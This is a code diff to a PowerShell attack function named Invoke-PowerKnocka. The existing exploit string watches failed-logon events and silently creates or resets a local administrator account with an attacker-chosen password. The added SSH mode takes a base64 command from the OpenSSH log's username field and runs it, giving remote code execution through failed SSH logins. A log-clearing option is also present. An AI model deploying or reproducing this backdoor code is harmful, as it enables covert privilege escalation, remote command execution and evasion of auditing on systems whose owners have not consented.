@@ -24,7 +24,9 @@ function Invoke-PowerKnocka {
         [bool]$ClearLog = $false,
 
         [Parameter(Mandatory)]
-        [bool]$NBName
+        [bool]$NBName,
+
+        [bool]$SSH = $false
     )
 
     if ($DC) {
@@ -32,6 +34,10 @@ function Invoke-PowerKnocka {
     }
     else {
         $ExploitString = '-WindowStyle Hidden -NoP -NonI $e = Get-EventLog -LogName Security -InstanceId 4625 -Newest 1; $n = $e.ReplacementStrings[5];if ($e.ReplacementStrings[6] -eq ' + $NBName + ') {if (net user $n) {net user $n ' + $Password + '} else {net user $n ' + $Password + ' /add;net localgroup administrators $n /add}}'
+    }
+
+    if ($SSH) {
+        $ExploitString = '-Enc ((Get-WinEvent -LogName OpenSSH/Operational -MaxEvents 1 | Select -ExpandProperty Message) | %{$_.split(" ")[6]} | %{$_.split("-")[1]} | Get-Unique)'
     }
 
     if ($ClearLog) {
